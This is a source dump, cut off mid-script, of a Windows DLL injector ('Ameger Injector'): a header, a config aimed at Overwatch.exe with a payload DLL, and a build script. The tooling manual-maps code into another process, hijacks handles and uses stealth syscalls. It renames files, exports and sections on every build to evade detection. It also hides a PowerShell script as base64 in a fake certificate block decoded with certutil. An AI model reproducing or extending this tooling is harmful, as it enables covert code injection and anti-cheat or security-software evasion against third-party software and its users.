### Ameger/System/Symbol/Parser/SymbolParser.h â€” 28 lines â€” sha12:692B0DB5D1BE
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"
#include "Core/Utility/Binary/DynamicAPI.h"

#include "System/Symbol/Loader/SymbolLoader.h"

class SYMBOL_PARSER
{
	dyn::DbgHelpTable	m_Api{};
	HMODULE				m_Module		= nullptr;
	HANDLE				m_hProcess		= NULL;
	bool				m_bInitialized	= false;
	bool				m_bReady			= false;
	DWORD64				m_SymbolTable		= 0;

	SYMBOL_PARSER(const SYMBOL_PARSER &) = delete;
	SYMBOL_PARSER & operator=(const SYMBOL_PARSER &) = delete;

public:

	SYMBOL_PARSER();
	~SYMBOL_PARSER();

	DWORD Initialize(const SYMBOL_LOADER * pSymbolObject);

	void Cleanup();

	DWORD GetSymbolAddress(const char * szSymbolName, DWORD & RvaOut);

	DWORD GetTypeId(const char * szTypeName, DWORD64 & TypeIdOut);
	DWORD GetTypeSize(const char * szTypeName, ULONG64 & SizeOut);
	DWORD GetFieldOffset(const char * szTypeName, const char * szFieldName, DWORD & OffsetOut);

	DWORD GetFieldOffsetAny(const char * const * TypeNames, size_t TypeCount, const char * szFieldName, DWORD & OffsetOut);
	DWORD GetTypeSizeAny(const char * const * TypeNames, size_t TypeCount, ULONG64 & SizeOut);

	DWORD GetEnumValueAny(const char * const * TypeNames, size_t TypeCount, const char * szConstantName, DWORD & ValueOut);
};

inline SYMBOL_PARSER sym_parser;

```

### Build/Configuration.ini â€” 29 lines â€” sha12:C8500EE8C452
```ini
[General]
TestMode = N
Timeout = 30000
SchemaVersion = 1
ProcessName = "Overwatch.exe"
PayloadSha256 = 551F794BA6C38BB1FA01A35CDA6C4E282D396F23C892A902D127E2A0D13279DB

Quiet = N
HijackScan = Y
VerboseTrace = Y
DetachConsole = N
HandleHijacking = Y
SponsorRoundtrip = N
DiscardResultLogOnSuccess = N

AutoConfirm = N
TestTarget = notepad.exe

SurveyMaxMb = 0
SurveyMaxRegions = 0
SurveyMaxSampleRegions = 0

DonorOwnerBlocklist =

[ManualMap]
ExecuteTLS = Y
RunDLLMain = Y
LockLoaderLock = Y
ResolveImports = Y
EnableExceptions = N
SetPageProtections = Y
InitSecurityCookie = Y
ResolveDelayImports = Y
CleanDataDirectories = Y
```

### Build/Executors/Create.bat â€” 746 lines â€” sha12:4205B0A8E29C
```bat
@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "NO_PAUSE=0"
if defined CREATE_NO_PAUSE set "NO_PAUSE=%CREATE_NO_PAUSE%"
if /i "%~1"=="/nopause" set "NO_PAUSE=1"
set "REPIN=0"
if /i "%~1"=="repin" set "REPIN=1"
if /i "%~1"=="/repin" set "REPIN=1"

set "C_RESET="
set "C_GREEN="
set "C_RED="
set "C_YELLOW="
if /i not "%AMEGER_NO_COLOR%"=="1" for /f %%A in ('echo prompt $E ^| cmd') do set "ESC=%%A"
if defined ESC (
    set "C_RESET=%ESC%[0m"
    set "C_GREEN=%ESC%[92m"
    set "C_RED=%ESC%[91m"
    set "C_YELLOW=%ESC%[93m"
)

for %%I in ("%~dp0..\..") do set "ROOT=%%~fI"
set "BUILD_DIR=%ROOT%\Build"
set "OUT_ROOT=%ROOT%\Build\Release"
set "DEPS_RELEASE=%OUT_ROOT%"
set "RELEASE_CACHE=%OUT_ROOT%\Cache"
set "CACHE_RUNTIME=%RELEASE_CACHE%\Runtime"
set "CACHE_INTERFACE=%RELEASE_CACHE%\Injector"
set "SCRIPTS_DIR=%BUILD_DIR%\Scripts"
set "MUTATE_SCRIPT=%SCRIPTS_DIR%\BuildPE.ps1"
set "SEED_SCRIPT=%SCRIPTS_DIR%\CreateSeeds.ps1"
set "CONFIG_SCRIPT=%SCRIPTS_DIR%\ProtectConfig.ps1"
set "VERIFY_SCRIPT=%SCRIPTS_DIR%\VerifyEmbedMagic.ps1"
set "VERIFY_SYSCALL_SCRIPT=%SCRIPTS_DIR%\VerifySyscallsLayer.ps1"
set "NAMES_SCRIPT=%SCRIPTS_DIR%\ShuffleNaming.ps1"
set "RENAME_SCRIPT=%SCRIPTS_DIR%\ShuffleExports.ps1"
set "EXPORTS_SCRIPT=%SCRIPTS_DIR%\VerifyExportsName.ps1"
set "REPIN_SCRIPT=%SCRIPTS_DIR%\RepinPayload.ps1"
set "NAMES_STATE=%RELEASE_CACHE%\BuildNames.state"
set "CONFIG_MASTER=%BUILD_DIR%\Configuration.ini"
set "PAYLOAD_ASSET=%ROOT%\Assets\DLL\Jlov.dll"
set "PAYLOAD_PROTECTED=%ROOT%\Assets\DLL\Jlov.protected.dll"
set "PAYLOAD_DEST="
set "RUNTIME_STOCK_DLL=%DEPS_RELEASE%\Ameger Injector - x64.dll"
set "LIBRARY_PROJ=%ROOT%\Interface\Template\AmegerInjector.vcxproj"
set "INTERFACE_PROJ=%ROOT%\Interface\Template\AmegerInjectorInterface.vcxproj"
set "OUT64=%OUT_ROOT%"
set "LIBRARY64_OBJ=%CACHE_RUNTIME%"
set "INTERFACE64_OBJ=%CACHE_INTERFACE%"
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
set "MSBUILD="

if "%REPIN%"=="1" goto :repin_payload
echo [%C_GREEN%1%C_RESET%/%C_GREEN%6%C_RESET%] Checking MSBuild...
echo.
call :find_msbuild
if errorlevel 1 goto :msbuild_error
if not defined AMEGER_PLATFORM_TOOLSET call :select_toolset
set "TOOLSET_ARG="
if defined AMEGER_PLATFORM_TOOLSET set "TOOLSET_ARG=/p:PlatformToolset=%AMEGER_PLATFORM_TOOLSET%"
set "SDK_ARG="
if defined AMEGER_WINDOWS_SDK_VERSION set "SDK_ARG=/p:WindowsTargetPlatformVersion=%AMEGER_WINDOWS_SDK_VERSION%"
echo   %C_GREEN%[+]%C_RESET% MSBuild: %C_GREEN%%MSBUILD%%C_RESET%
if defined AMEGER_PLATFORM_TOOLSET echo   %C_GREEN%[+]%C_RESET% Platform toolset: %C_GREEN%%AMEGER_PLATFORM_TOOLSET%%C_RESET%
if defined AMEGER_WINDOWS_SDK_VERSION echo   %C_GREEN%[+]%C_RESET% Windows SDK: %C_GREEN%%AMEGER_WINDOWS_SDK_VERSION%%C_RESET%
echo.
echo.

echo [%C_GREEN%2%C_RESET%/%C_GREEN%6%C_RESET%] Checking Projects...
echo.
if not exist "%LIBRARY_PROJ%" goto :source_error
if not exist "%INTERFACE_PROJ%" goto :source_error
echo   %C_GREEN%[+]%C_RESET% Runtime And Interface Projects Present.
echo.
echo.

echo [%C_GREEN%3%C_RESET%/%C_GREEN%6%C_RESET%] Cleaning Release And Cache...
echo.
call :clean_directory "%OUT_ROOT%"
if errorlevel 1 goto :clean_error
call :clean_directory "%BUILD_DIR%\obj"
if errorlevel 1 goto :clean_error
call :prepare_cache
if errorlevel 1 goto :clean_error
echo   %C_GREEN%[+]%C_RESET% Clean Layout Prepared In %C_GREEN%%RELEASE_CACHE%%C_RESET%.
echo.
echo.
call :generate_names
if errorlevel 1 goto :names_error
set "DLL_DIR=%OUT_ROOT%\%DLLDIR_NAME%"
if not exist "%DLL_DIR%" mkdir "%DLL_DIR%"
if not exist "%DLL_DIR%" (
  echo   %C_RED%Error: Unable To Create The Per-Build DLL Folder; Refusing To Deploy Stable Names.%C_RESET%
  goto :clean_error
)
set "DEPLOYED_CONFIG=%OUT_ROOT%\%CONFIG_NAME%.ini"
set "PAYLOAD_DEST=%DLL_DIR%\%PAYLOAD_NAME%"
set "INTERFACE_EXE=%OUT64%\%EXE_NAME%.exe"
echo   %C_GREEN%[+]%C_RESET% Deployed Payload Name = %C_GREEN%%PAYLOAD_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Deployed Runtime Name = %C_GREEN%%RUNTIME_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Deployed Launcher Name = %C_GREEN%%EXE_NAME%.exe%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Deployed DLL Folder = %C_GREEN%%DLLDIR_NAME%%C_RESET%
echo.
echo.

call :maybe_adopt_payload
if errorlevel 1 goto :payload_error

echo [%C_GREEN%4%C_RESET%/%C_GREEN%6%C_RESET%] Building Injector...
set "MUTATE_ARGS="
if /i "%AMEGER_REFUSE_UNMUTATED%"=="1" goto :seeds_ready
where powershell.exe >nul 2>&1
if errorlevel 1 goto :seeds_missing
if not exist "%SEED_SCRIPT%" goto :seeds_missing
set "AmegerMmapSentinel="
set "AmegerStringSeed="
for /f "usebackq tokens=1,2 delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%SEED_SCRIPT%"`) do set "%%A=%%B"
if not defined AmegerMmapSentinel goto :seeds_missing
if not defined AmegerStringSeed goto :seeds_missing
set /a "AmegerStubSeed=(%AmegerMmapSentinel%) & 0x7FFFFFFF"
if not defined AmegerStubSeed goto :seeds_missing
if "%AmegerStubSeed%"=="0" goto :seeds_missing
    set "MUTATE_ARGS=/p:AmegerMmapSentinel=%AmegerMmapSentinel% /p:AmegerStringSeed=%AmegerStringSeed% /p:AmegerStubSeed=%AmegerStubSeed%"
echo.
echo   %C_GREEN%[+]%C_RESET% Per-Build Sentinel = %C_GREEN%%AmegerMmapSentinel%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% Per-Build String Seed = %C_GREEN%%AmegerStringSeed%%C_RESET%
echo.
goto :seeds_ready

:seeds_missing
echo.
echo   %C_RED%Error: Per-Build Seed Generation Failed; Refusing To Build With Fixed Seeds.%C_RESET%
goto :failure

:seeds_ready
call :build_project "%LIBRARY_PROJ%" x64 "%DEPS_RELEASE%" "%LIBRARY64_OBJ%" "%TOOLSET_ARG%" "%SDK_ARG%" "%MUTATE_ARGS%"
if errorlevel 1 goto :build_error

REM The remote mapping shell is staged into the target as one contiguous span sized from
REM (MMAP_SEC_END - ManualMapping_Shell), which is only correct if the linker merged every
REM .code$NN part into a single section. That has to be checked on the raw linker output:
REM BuildPE.ps1 randomises every section name a few lines below, so by the end of the build the
REM section is no longer called .code and the check could not find it. This is the one content
REM check that cannot be a byte scan, because an unmerged link still passes every pattern scan.
call :verify_mmap_sections "%RUNTIME_STOCK_DLL%"
if errorlevel 1 goto :verify_error
echo.
if /i "%AMEGER_REFUSE_UNMUTATED%"=="1" goto :runtime_mutate_ready
if not exist "%MUTATE_SCRIPT%" goto :runtime_mutate_missing
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%MUTATE_SCRIPT%" "%RUNTIME_STOCK_DLL%"
if errorlevel 1 goto :mutate_fatal
goto :runtime_mutate_ready

:runtime_mutate_missing
echo   %C_RED%Error: BuildPE.ps1 Was Not Found; Refusing To Continue With An Unmutated Runtime DLL.%C_RESET%
goto :failure

:runtime_mutate_ready
call :rename_exports
if errorlevel 1 goto :rename_export_error
call :write_names_state
if errorlevel 1 goto :names_state_error
where powershell.exe >nul 2>&1
if errorlevel 1 goto :hash_error
set "RUNTIME_SHA256="
set "RTSHA_TMP=%TEMP%\amg_rtsha_%RANDOM%%RANDOM%"
set "RTSHA_B64=%RTSHA_TMP%.b64"
set "RTSHA_PS1=%RTSHA_TMP%.ps1"
set "RTSHA_OUT=%RTSHA_TMP%.out"
>"%RTSHA_B64%" echo -----BEGIN CERTIFICATE-----
>>"%RTSHA_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKSkpIC1yZXBsYWNlICctJywnJykNCldyaXRlLU91dHB1dCAoJ1JVTlRJTUVfU0hBMjU2PScgKyAkaCkNCldyaXRlLU91dHB1dCAoJ0gwPTB4JyArICRoLlN1YnN0cmluZygwLDgpKQ0KV3JpdGUtT3V0cHV0ICgnSDE9MHgnICsgJGguU3Vic3RyaW5nKDgsOCkpDQpXcml0ZS1PdXRwdXQgKCdIMj0weCcgKyAkaC5TdWJzdHJpbmcoMTYsOCkpDQpXcml0ZS1PdXRwdXQgKCdIMz0weCcgKyAkaC5TdWJzdHJpbmcoMjQsOCkpDQpXcml0ZS1PdXRwdXQgKCdIND0weCcgKyAkaC5TdWJzdHJpbmcoMzIsOCkpDQpXcml0ZS1PdXRwdXQgKCdINT0weCcgKyAkaC5TdWJzdHJpbmcoNDAsOCkpDQpXcml0ZS1PdXRwdXQgKCdINj0weCcgKyAkaC5TdWJzdHJpbmcoNDgsOCkpDQpXcml0ZS1PdXRwdXQgKCdINz0weCcgKyAkaC5TdWJzdHJpbmcoNTYsOCkpDQo=
>>"%RTSHA_B64%" echo -----END CERTIFICATE-----
certutil -decode "%RTSHA_B64%" "%RTSHA_PS1%" >nul 2>&1
if errorlevel 1 goto :rtsha_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%RTSHA_PS1%" -Path "%RUNTIME_STOCK_DLL%" >"%RTSHA_OUT%" 2>&1
for /f "usebackq tokens=1,2 delims==" %%A in ("%RTSHA_OUT%") do set "%%A=%%B"
:rtsha_cleanup
if exist "%RTSHA_PS1%" del /f /q "%RTSHA_PS1%" >nul 2>&1
if exist "%RTSHA_B64%" del /f /q "%RTSHA_B64%" >nul 2>&1
if exist "%RTSHA_OUT%" del /f /q "%RTSHA_OUT%" >nul 2>&1
if not defined RUNTIME_SHA256 goto :hash_error
if not defined H0 goto :hash_error
if not defined H1 goto :hash_error
if not defined H2 goto :hash_error
if not defined H3 goto :hash_error
if not defined H4 goto :hash_error
if not defined H5 goto :hash_error
if not defined H6 goto :hash_error
if not defined H7 goto :hash_error
set "RUNTIME_HASH_ARGS=/p:AmegerRuntimeHash0=%H0% /p:AmegerRuntimeHash1=%H1% /p:AmegerRuntimeHash2=%H2% /p:AmegerRuntimeHash3=%H3% /p:AmegerRuntimeHash4=%H4% /p:AmegerRuntimeHash5=%H5% /p:AmegerRuntimeHash6=%H6% /p:AmegerRuntimeHash7=%H7% /p:AmegerStringSeed=%AmegerStringSeed% /p:AmegerExeName=%EXE_NAME% /p:AmegerConfigMagic=%CONFIG_MAGIC%"
set "RUNTIME_DLL_NAME=%RUNTIME_NAME%"
set "RUNTIME_DLL=%DLL_DIR%\%RUNTIME_DLL_NAME%"
if not exist "%DLL_DIR%" mkdir "%DLL_DIR%"
move /y "%RUNTIME_STOCK_DLL%" "%RUNTIME_DLL%" >nul
if not exist "%RUNTIME_DLL%" goto :runtime_rename_error
echo   %C_GREEN%[+]%C_RESET% Runtime SHA-256 = %RUNTIME_SHA256%
echo.
call :build_project "%INTERFACE_PROJ%" x64 "%OUT64%" "%INTERFACE64_OBJ%" "%TOOLSET_ARG%" "%SDK_ARG%" "%RUNTIME_HASH_ARGS%"
if errorlevel 1 goto :build_error
echo.
echo.

echo [%C_GREEN%5%C_RESET%/%C_GREEN%6%C_RESET%] Deploying Release Binaries...
echo.
echo   %C_GREEN%[+]%C_RESET% Runtime Binaries Are In %C_GREEN%%OUT_ROOT%%C_RESET%.
call :deploy_payload
if errorlevel 1 goto :payload_error
call :protect_config
if errorlevel 1 goto :config_error
echo.
echo.

echo [%C_GREEN%6%C_RESET%/%C_GREEN%6%C_RESET%] Sweeping Intermediates Into Cache And Verifying...
echo.
set "EXE_COUNT=0"
for %%F in ("%OUT64%\*.exe") do set /a "EXE_COUNT+=1"
if not "%EXE_COUNT%"=="1" (
  echo   %C_RED%Error: Expected Exactly One Launcher EXE In %OUT64%, Found %EXE_COUNT%.%C_RESET%
  goto :verify_error
)
if not exist "%INTERFACE_EXE%" (
  echo   %C_RED%Error: Expected Launcher Missing: %INTERFACE_EXE%%C_RESET%
  goto :verify_error
)
call :verify "%INTERFACE_EXE%" "x64 Interface"
if errorlevel 1 goto :verify_error
call :verify_embed
if errorlevel 1 goto :verify_content_error
call :verify_config_magic
if errorlevel 1 goto :verify_content_error
call :verify_deployed_pin
if errorlevel 1 goto :verify_content_error
call :verify_config_keys
if errorlevel 1 goto :verify_content_error
call :verify "%RUNTIME_DLL%" "x64 runtime"
if errorlevel 1 goto :verify_error
call :verify_syscall_stub
if errorlevel 1 goto :verify_content_error
call :verify_syscall_payload
if errorlevel 1 goto :verify_content_error
call :verify_syscall_stealth
if errorlevel 1 goto :verify_content_error
call :verify_export_names "%RUNTIME_DLL%"
if errorlevel 1 goto :verify_content_error
echo.
echo   %C_GREEN%[+]%C_RESET% SyscallStub         = %C_GREEN%OK%C_RESET%
echo   %C_GREEN%[+]%C_RESET% SyscallPayload      = %C_GREEN%OK%C_RESET%
echo   %C_GREEN%[+]%C_RESET% SyscallStealth      = %C_GREEN%OK%C_RESET%
echo.
call :remove_import_artifacts "%DEPS_RELEASE%"
if errorlevel 1 goto :cleanup_error
call :remove_import_artifacts "%DLL_DIR%"
if errorlevel 1 goto :cleanup_error
call :sweep_artifacts
if errorlevel 1 goto :cleanup_error
echo.
echo   %C_GREEN%[+]%C_RESET% Cache Groups = Runtime, Injector.
echo.
echo.

if /i "%AMEGER_REFUSE_UNMUTATED%"=="1" goto :refuse_unmutated
if not exist "%MUTATE_SCRIPT%" goto :mutate_exe_error
where powershell.exe >nul 2>&1
if errorlevel 1 goto :mutate_exe_error
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%MUTATE_SCRIPT%" "%INTERFACE_EXE%"
if errorlevel 1 goto :mutate_exe_error
call :verify_embed
if errorlevel 1 goto :verify_content_error

call :write_section_manifest
if errorlevel 1 goto :manifest_error
echo.
echo Build Completed Successfully.
echo.
echo Cache = %C_GREEN%%RELEASE_CACHE%%C_RESET%
echo Payload = %C_GREEN%%PAYLOAD_DEST%%C_RESET%
echo Interface x64 = %C_GREEN%%INTERFACE_EXE%%C_RESET%
echo Runtime DLL = %C_GREEN%%RUNTIME_DLL%%C_RESET%

echo.
call :scrub_build_cache
if errorlevel 1 goto :scrub_error
if "%NO_PAUSE%"=="0" pause
exit /b 0

:find_msbuild
if exist "%VSWHERE%" for /f "usebackq delims=" %%M in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -find "MSBuild\**\Bin\MSBuild.exe" 2^>nul`) do if not defined MSBUILD if exist "%%M" set "MSBUILD=%%M"
if defined MSBUILD exit /b 0
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\Professional\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\Professional\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\18\Enterprise\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\18\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
if not defined MSBUILD if exist "%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\MSBuild.exe" set "MSBUILD=%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
if defined MSBUILD exit /b 0
for /f "delims=" %%M in ('where msbuild.exe 2^>nul') do if not defined MSBUILD set "MSBUILD=%%M"
if defined MSBUILD exit /b 0
exit /b 1

:select_toolset
if defined AMEGER_PLATFORM_TOOLSET exit /b 0
if not exist "%VSWHERE%" exit /b 0
set "VS_VERSION="
for /f "usebackq delims=" %%V in (`"%VSWHERE%" -latest -products * -property installationVersion 2^>nul`) do if not defined VS_VERSION set "VS_VERSION=%%V"
if not defined VS_VERSION exit /b 0
for /f "tokens=1 delims=." %%V in ("%VS_VERSION%") do set "VS_MAJOR=%%V"
if "%VS_MAJOR%"=="18" set "AMEGER_PLATFORM_TOOLSET=v145"
if "%VS_MAJOR%"=="17" set "AMEGER_PLATFORM_TOOLSET=v143"
exit /b 0

:clean_directory
if exist "%~1" rmdir /s /q "%~1"
if exist "%~1" exit /b 1
exit /b 0

:prepare_cache
if not exist "%DEPS_RELEASE%" mkdir "%DEPS_RELEASE%"
if not exist "%RELEASE_CACHE%" mkdir "%RELEASE_CACHE%"
if not exist "%CACHE_RUNTIME%" mkdir "%CACHE_RUNTIME%"
if not exist "%CACHE_INTERFACE%" mkdir "%CACHE_INTERFACE%"
if not exist "%CACHE_RUNTIME%" exit /b 1
if not exist "%CACHE_INTERFACE%" exit /b 1
exit /b 0

:generate_names
if not exist "%NAMES_SCRIPT%" (
  echo   %C_RED%Error: ShuffleNaming.ps1 Not Found; Refusing To Deploy Stable Names.%C_RESET%
  exit /b 1
)
where powershell.exe >nul 2>&1
if errorlevel 1 (
  echo   %C_RED%Error: PowerShell Unavailable; Refusing To Deploy Stable Names.%C_RESET%
  exit /b 1
)
set "PAYLOAD_NAME="
set "RUNTIME_NAME="
set "EXE_NAME="
set "DLLDIR_NAME="
set "CONFIG_NAME="
set "CONFIG_MAGIC="
for /f "usebackq tokens=1,2 delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%NAMES_SCRIPT%"`) do set "%%A=%%B"
if not defined PAYLOAD_NAME exit /b 1
if not defined RUNTIME_NAME exit /b 1
if not defined EXE_NAME exit /b 1
if not defined DLLDIR_NAME exit /b 1
if not defined CONFIG_NAME exit /b 1
if not defined CONFIG_MAGIC exit /b 1
if /i "%PAYLOAD_NAME%"=="%RUNTIME_NAME%" exit /b 1
if /i "%PAYLOAD_NAME%"=="%EXE_NAME%" exit /b 1
if /i "%PAYLOAD_NAME%"=="%DLLDIR_NAME%" exit /b 1
if /i "%PAYLOAD_NAME%"=="%CONFIG_NAME%" exit /b 1
if /i "%RUNTIME_NAME%"=="%EXE_NAME%" exit /b 1
if /i "%RUNTIME_NAME%"=="%DLLDIR_NAME%" exit /b 1
if /i "%RUNTIME_NAME%"=="%CONFIG_NAME%" exit /b 1
if /i "%EXE_NAME%"=="%DLLDIR_NAME%" exit /b 1
if /i "%EXE_NAME%"=="%CONFIG_NAME%" exit /b 1
if /i "%DLLDIR_NAME%"=="%CONFIG_NAME%" exit /b 1
echo   %C_GREEN%[+]%C_RESET% PayloadName = %C_GREEN%%PAYLOAD_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% RuntimeName = %C_GREEN%%RUNTIME_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% ExeName     = %C_GREEN%%EXE_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% DllDirName  = %C_GREEN%%DLLDIR_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% ConfigName  = %C_GREEN%%CONFIG_NAME%%C_RESET%
echo   %C_GREEN%[+]%C_RESET% LogName     = %C_GREEN%%CONFIG_NAME%.log%C_RESET%
echo   %C_GREEN%[+]%C_RESET% ConfigMagic = %C_GREEN%%CONFIG_MAGIC%%C_RESET%
echo.
exit /b 0

:rename_exports
if not exist "%RENAME_SCRIPT%" (
  echo   %C_RED%Error: ShuffleExports.ps1 Not Found; Refusing To Ship Stable Export Names.%C_RESET%
  exit /b 1
)
where powershell.exe >nul 2>&1
if errorlevel 1 (
  echo   %C_RED%Error: PowerShell Unavailable; Refusing To Ship Stable Export Names.%C_RESET%
  exit /b 1
)
set "RENAME_STATUS="
set "EXPORT_MAP="
for /f "usebackq tokens=1,* delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%RENAME_SCRIPT%" -Path "%RUNTIME_STOCK_DLL%"`) do set "%%A=%%B"
if /i not "%RENAME_STATUS%"=="ok" (
  echo   %C_RED%Error: Runtime Export Rename Failed; Refusing To Ship Stable Export Names.%C_RESET%
  exit /b 1
)
if not defined EXPORT_MAP (
  echo   %C_RED%Error: Runtime Export Rename Produced No Map; Refusing To Ship Stable Export Names.%C_RESET%
  exit /b 1
)
echo   %C_GREEN%[+]%C_RESET% Runtime Exports Renamed (Map Captured).
exit /b 0

:write_names_state
if not exist "%RELEASE_CACHE%" mkdir "%RELEASE_CACHE%"
if not exist "%RELEASE_CACHE%" exit /b 1
>"%NAMES_STATE%" echo PAYLOAD_NAME=%PAYLOAD_NAME%
>>"%NAMES_STATE%" echo RUNTIME_NAME=%RUNTIME_NAME%
>>"%NAMES_STATE%" echo EXE_NAME=%EXE_NAME%
>>"%NAMES_STATE%" echo DLLDIR_NAME=%DLLDIR_NAME%
>>"%NAMES_STATE%" echo CONFIG_NAME=%CONFIG_NAME%
>>"%NAMES_STATE%" echo LOG_NAME=%CONFIG_NAME%.log
>>"%NAMES_STATE%" echo CONFIG_MAGIC=%CONFIG_MAGIC%
>>"%NAMES_STATE%" echo EXPORT_MAP=%EXPORT_MAP%
if not exist "%NAMES_STATE%" exit /b 1
exit /b 0

:build_project
set "PROJECT=%~1"
set "ARCH=%~2"
set "PROJECT_OUT=%~3"
set "PROJECT_INT=%~4"
if not exist "%PROJECT%" exit /b 2
if not exist "%PROJECT_OUT%" mkdir "%PROJECT_OUT%"
if not exist "%PROJECT_OUT%" exit /b 2
if not exist "%PROJECT_INT%" mkdir "%PROJECT_INT%"
if not exist "%PROJECT_INT%" exit /b 2
echo   %C_GREEN%Building%C_RESET% %PROJECT% %C_RED%(%ARCH%)%C_RESET%
"%MSBUILD%" "%PROJECT%" /nologo /m /nodeReuse:false /v:minimal /t:Build /p:Configuration=Release /p:Platform=%~2 "/p:OutDir=%~3\\" "/p:IntDir=%~4\\" %~5 %~6 %~7
exit /b %ERRORLEVEL%

:verify
if not exist "%~1" exit /b 1
echo   %C_GREEN%OK%C_RESET% %~2 = %C_GREEN%"%~1"%C_RESET%
exit /b 0

:verify_embed
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SCRIPT%" -Check Embed -Path "%INTERFACE_EXE%" -Words "%H0%,%H1%,%H2%,%H3%,%H4%,%H5%,%H6%,%H7%"
exit /b %ERRORLEVEL%

:verify_config_magic
if not defined CONFIG_MAGIC exit /b 1
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SCRIPT%" -Check Magic -Path "%DEPLOYED_CONFIG%" -Magic "%CONFIG_MAGIC%"
exit /b %ERRORLEVEL%

:verify_deployed_pin
if not defined CONFIG_MAGIC exit /b 1
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SCRIPT%" -Check DeployedPin -Path "%DEPLOYED_CONFIG%" -Magic "%CONFIG_MAGIC%" -ExpectPin "%DEPLOYED_SHA%"
exit /b %ERRORLEVEL%

:verify_config_keys
if not defined CONFIG_MAGIC exit /b 1
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SCRIPT%" -Check ConfigKeys -Path "%DEPLOYED_CONFIG%" -Magic "%CONFIG_MAGIC%"
exit /b %ERRORLEVEL%

REM Confirms the stealth critical plumbing is actually compiled into the shipped runtime. These are
REM static checks on the built image; the live behaviour is covered by the runtime verify tool.
:verify_syscall_stub
if not exist "%VERIFY_SYSCALL_SCRIPT%" exit /b 1
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SYSCALL_SCRIPT%" -Check Stub -Path "%RUNTIME_DLL%"
exit /b %ERRORLEVEL%

:verify_syscall_payload
if not exist "%VERIFY_SYSCALL_SCRIPT%" exit /b 1
